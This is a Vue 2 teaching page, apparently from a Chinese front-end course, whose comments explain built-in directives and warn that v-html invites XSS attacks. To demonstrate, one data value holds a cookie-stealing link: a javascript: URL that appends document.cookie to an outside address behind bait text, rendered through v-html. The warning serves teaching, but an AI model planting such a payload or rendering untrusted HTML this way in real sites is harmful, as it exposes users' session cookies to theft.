<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>内置指令</title>
    <script src="../vue.js"></script>
  </head>

  <!-- 内置指令 
        v-bind: 单向绑定解析表达式，可简写为  :xxx
        v-model: 双向数据绑定
        v-for:   遍历数组/对象/字符串
        v-on:   绑定事件监听，可简写为@
        v-if：  条件渲染(动态控制节点是否存在)   
        v-else: 条件渲染(动态控制节点是否存在)   
        v-show: 条件渲染(动态控制节点是否展示) 
        
    v-text指令：
            1 作用：向其所在的节点中渲染文本内容
            2 与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会
    v-html指令
            1 作用：向指定节点中渲染包含html结构的内容
            2 与插值语法的区别：
                a:v-html会替换掉节点中所有的内容，{{xx}}则不会
                b:v-html可以识别html结构
            3 严重注意：v-html有安全性问题！！！！
                a:在网站上动态渲染任意html是非常危险的，容易导致xss攻击
                b:一定要在可信的内容上使用v-html，不要用在用户提交的内容上


          -->

  <body>
    <div id="root">
      <!-- 插值语法演示 -->
      <div>{{name}}</div>
      <!-- v-html语法演示 -->
      <div v-html="str"></div>
      <div v-html="str2"></div>
    </div>
  </body>
  <script>
    Vue.config.productionTip = false;

    new Vue({
      el: "#root",
      data: {
        name: "尚硅谷",
        str: "<h3>你好好</h3>",
        //如下如果使用v-html可能会导致在页面跳转的时候会携带本网页的cookie跳转到指定网站
        str2: "<a href=javascript:location.href='http://www.baidu.com?'+document.cookie>点击这里有你想要的资源</a>",
      },
    });
  </script>
</html>
